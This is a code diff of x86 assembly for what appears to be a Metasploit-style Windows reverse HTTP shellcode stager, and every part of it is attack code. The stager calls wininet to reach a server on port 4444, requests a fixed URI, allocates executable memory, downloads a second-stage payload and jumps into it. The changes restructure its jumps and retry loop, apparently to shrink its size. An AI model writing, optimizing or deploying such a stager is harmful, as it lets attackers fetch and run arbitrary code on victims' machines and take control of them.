@@ -27,10 +27,7 @@ internetopen:
   push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
   call ebp
 
-  jmp short dbl_get_server_host
-
 internetconnect:
-  pop ebx                ; Save the hostname pointer
   xor ecx, ecx
   push ecx               ; DWORD_PTR dwContext (NULL)
   push ecx               ; dwFlags
@@ -38,36 +35,35 @@ internetconnect:
   push ecx               ; password
   push ecx               ; username
   push dword 4444        ; PORT
-  push ebx               ; HOSTNAME
+  jmp short dbl_get_server_host ; push pointer to HOSTNAME
+got_server_host:
   push eax               ; HINTERNET hInternet
   push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
   call ebp
 
-  jmp get_server_uri
-
 httpopenrequest:
-  pop ecx
   xor edx, edx           ; NULL
   push edx               ; dwContext (NULL)
   push (0x80000000 | 0x04000000 | 0x00200000 | 0x00000200 | 0x00400000) ; dwFlags
     ;0x80000000 |        ; INTERNET_FLAG_RELOAD
     ;0x04000000 |        ; INTERNET_NO_CACHE_WRITE
-	;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
+    ;0x00200000 |        ; INTERNET_FLAG_NO_AUTO_REDIRECT
     ;0x00000200 |        ; INTERNET_FLAG_NO_UI
     ;0x00400000          ; INTERNET_FLAG_KEEP_CONNECTION
   push edx               ; accept types
   push edx               ; referrer
   push edx               ; version
-  push ecx               ; url
+  jmp get_server_uri     ; push pointer to url
+got_server_uri:
   push edx               ; method
   push eax               ; hConnection
   push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
   call ebp
-  mov esi, eax           ; hHttpRequest
+  xchg esi, eax          ; hHttpRequest in esi
 
 set_retry:
   push byte 0x10
-  pop ebx
+  pop ecx
 
 httpsendrequest:
   xor edi, edi
@@ -82,22 +78,22 @@ httpsendrequest:
   jnz short allocate_memory
 
 try_it_again:
-  dec ebx
-  jz failure
-  jmp short httpsendrequest
+  loopnz httpsendrequest
+
+; fall through to failure
+
+failure:
+  push 0x56A2B5F0        ; hardcoded to exitprocess for size
+  call ebp
 
 dbl_get_server_host:
   jmp get_server_host
 
 get_server_uri:
-  call httpopenrequest
+  call got_server_uri
 
 server_uri:
  db "/12345", 0x00
-
-failure:
-  push 0x56A2B5F0        ; hardcoded to exitprocess for size
-  call ebp
 
 allocate_memory:
   push byte 0x40         ; PAGE_EXECUTE_READWRITE
@@ -135,7 +131,7 @@ execute_stage:
   ret                    ; dive into the stored stage address
 
 get_server_host:
-  call internetconnect
+  call got_server_host
 
 server_host:
 
